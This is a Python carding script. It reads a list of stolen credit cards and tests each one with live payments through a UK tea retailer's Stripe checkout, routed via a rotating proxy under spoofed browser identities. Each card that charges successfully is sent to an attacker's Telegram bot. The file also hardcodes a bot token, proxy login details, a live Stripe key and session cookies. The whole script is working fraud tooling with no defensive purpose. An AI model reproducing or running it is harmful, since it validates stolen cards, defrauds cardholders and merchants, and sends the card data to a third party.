import requests,base64,time,re,pycountry
from rich.console import Console
from rich.text import Text
from rich.panel import Panel
from rich.theme import Theme
token = ('7751524177:AAEhwNhLevjmiSX86dn3OqmjY_oOX26ec')
ID= ('5504121561')
from faker import Faker
import random ,uuid,urllib3
from time import sleep
faker = Faker()
fake = Faker()
from getuseragent import UserAgent
lat = ''.join(random.choice('qwaszxcerdfvbtyghnmjkluiop0987654321') for i in range(18))
import logging
import os
import requests
import time
import string
import random
import asyncio
import re
user_agent = UserAgent('windows').Random()
head1={
'user-agent':user_agent,
'Pragma':'no-cache',
'Accept':'*/*',
}
response1 = requests.get('https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US',headers=head1).json()
for x in response1['results']:
    name=x['name']['first']
    second=x['name']['last']
email=(name+second+'@outlook.com').lower()
fullname=name+' '+second




idz=[]
working = []
badcount = 0
workingcount = 0
import concurrent.futures
user_agent = UserAgent('windows').Random()

s = requests.Session()
def start():
    file = input('enter cc list: ')
    g = open(file, 'r')
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
        for g in g:
            c = g.strip().split('\n')[0]
            n, mm, yy, cvc = map(str.strip, c.split("|"))
            yy=c.split('|')[2][-2:]
            
            executor.submit(process_request, c, n, mm, yy, cvc)
def process_request(c,n, mm, yy, cvc):
            time_on_page = random.randint(30000, 120000)  
            letters = string.ascii_lowercase
            First = ''.join(random.choice(letters) for _ in range(6))
            Last = ''.join(random.choice(letters) for _ in range(6))
            PWD = ''.join(random.choice(letters) for _ in range(10))
            Name = f'{First}+{Last}'
            Email = f'{First}.{Last}@gmail.com'
            proxy = 'http://vemusbx-rotate:ytrshipzp83b@p.webshare.io:80'
            proxies = { 
                'http': proxy, 
                'https': proxy
            }
            headers = {
                "user-agent": user_agent,
                "accept": "application/json, text/plain, */*",
                "content-type": "application/x-www-form-urlencoded"
            }
            
            m = s.post('https://m.stripe.com/6', headers=headers)
            r = m.json()
            Guid = r['guid']
            Muid = r['muid']
            Sid = r['sid']
            cookies = {
                'PHPSESSID': '5e3934071863c20567ba783c30652e5e',
                '__stripe_mid': '476a9d1d-cfed-4d62-81df-1d23555feaf970c4ac',
                '__stripe_sid': '9cbc61e5-a80b-4b60-8d20-39a17f27042c3f7955',
            }
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9,ar;q=0.8,tr;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1',
                'origin': 'https://www.cupoftea.co.uk',
                'priority': 'u=0, i',
                'referer': 'https://www.cupoftea.co.uk/checkout/check',
                'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': user_agent,
                
            }
            data = {
                'form': 'confirm',
                'deposit': '0.00',
                'ordertotal': '10.65',
                'chargevat': '1',
                'postage': '3.95',
                'deliverytype': 'RoyalMail',
                'discount': '0',
                'vat': '1.7783333333333',
                'pay': 'stripe',
            }
            response = requests.post('https://www.cupoftea.co.uk/pay', cookies=cookies, headers=headers, data=data)
            sec=(response.text.split('clientSecret: "')[1].split('"')[0])
            set=(response.text.split('clientSecret: "')[1].split('_sec')[0])
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9,ar;q=0.8,tr;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'dnt': '1',
                'origin': 'https://js.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': user_agent,
            }
            data = f'return_url=https%3A%2F%2Fwww.cupoftea.co.uk%2Fstripe%2Fupdate_payment%3Forder%3D61913e005ee039bc1b92f9348f3f7a56&shipping[name]=fadea&shipping[address][city]=Ely&shipping[address][country]=GB&shipping[address][line1]=Ely+Road&shipping[address][line2]=Prickwillow&shipping[address][postal_code]=CB74UJ&shipping[address][state]=Cambridgeshire&payment_method_data[billing_details][name]=mr+dave+ali&payment_method_data[billing_details][email]=ddfmotor3%40gmail.com&payment_method_data[billing_details][address][city]=Ely&payment_method_data[billing_details][address][country]=GB&payment_method_data[billing_details][address][line1]=Ely+Road&payment_method_data[billing_details][address][line2]=Prickwillow&payment_method_data[billing_details][address][postal_code]=CB74UJ&payment_method_data[billing_details][address][state]=Cambridgeshire&payment_method_data[type]=card&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_year]={yy}&payment_method_data[card][exp_month]={mm}&payment_method_data[allow_redisplay]=unspecified&payment_method_data[payment_user_agent]=stripe.js%2F499e76535e%3B+stripe-js-v3%2F499e76535e%3B+payment-element&payment_method_data[referrer]=https%3A%2F%2Fwww.cupoftea.co.uk&payment_method_data[time_on_page]=182897&payment_method_data[client_attribution_metadata][client_session_id]=366def61-19ab-4e59-b7a0-301d63af37d6&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=standard&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=automatic&payment_method_data[guid]={Guid}&payment_method_data[muid]={Muid}&payment_method_data[sid]={Sid}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51NzN35CLdEhJnL1TFAsB12Tazs1AMmLhjSCpTjLUoH8agDMNfbZntvukr4q8ZyT0tq1Y8MXBqZbQppkZTTr9FDF2007mL6UO9l&client_secret={sec}'
            response = requests.post(
                f'https://api.stripe.com/v1/payment_intents/{set}/confirm',
                headers=headers,
                data=data,
            )
            if 'requires_action' in response.text:
                custom_theme = Theme({
                    "banner_name": "red",
                    "banner_info": "red",
                    "border": "red",
                    "title": "bold white on blue"
                })
                console = Console(theme=custom_theme)
                
                banner_name = "Require Action"
                
                styled_name = Text(banner_name, style="banner_name")
                banner_panel = Panel(
                    styled_name,
                    title=c,
                    title_align="center",
                    border_style="border",
                    padding=(1, 2),
                    expand=False
                )
                console.print(banner_panel)
            elif 'card_error' in response.text:
                code=response.text.split('"code": "')[1].split('"')[0]
                mes=response.text.split('"message": "')[1].split('"')[0]
                res=f'''
Error: {code}
Message: {mes}   
                '''
                custom_theme = Theme({
                    "banner_name": "red",
                    "banner_info": "red",
                    "border": "red",
                    "title": "bold white on blue"
                })
                console = Console(theme=custom_theme)
                
                banner_name = res
                
                styled_name = Text(banner_name, style="banner_name")
                banner_panel = Panel(
                    styled_name,
                    title=c,
                    title_align="center",
                    border_style="border",
                    padding=(1, 2),
                    expand=False
                )
                console.print(banner_panel)
            else:
                custom_theme = Theme({
                    "banner_name": "green",
                    "banner_info": "green",
                    "border": "green",
                    "title": "bold white on blue"
                })
                console = Console(theme=custom_theme)
                
                banner_name = 'CHARGED !'
                
                styled_name = Text(banner_name, style="banner_name")
                banner_panel = Panel(
                    styled_name,
                    title=c,
                    title_align="center",
                    border_style="border",
                    padding=(1, 2),
                    expand=False
                )
                console.print(banner_panel)
                res=f'Stripe Charged $5\n{c}'
                requests.get(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(res))
            time.sleep(10)

start()